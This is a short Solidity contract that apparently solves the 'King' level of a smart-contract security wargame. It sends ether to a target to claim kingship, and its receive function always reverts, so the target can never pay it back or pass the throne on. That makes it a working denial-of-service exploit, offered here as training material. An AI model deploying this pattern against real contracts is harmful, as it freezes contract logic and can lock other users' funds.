// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntKing {
    
}

contract kingAttack {
    IntKing public king;

    constructor(address payable target) payable {
        king = IntKing(target);
    }

    function claim() public payable {
        (bool success, ) = payable(address(king)).call{value: msg.value}("");
        require(success, "claim failed");
    }

    receive() external payable {
        revert();
     }
}
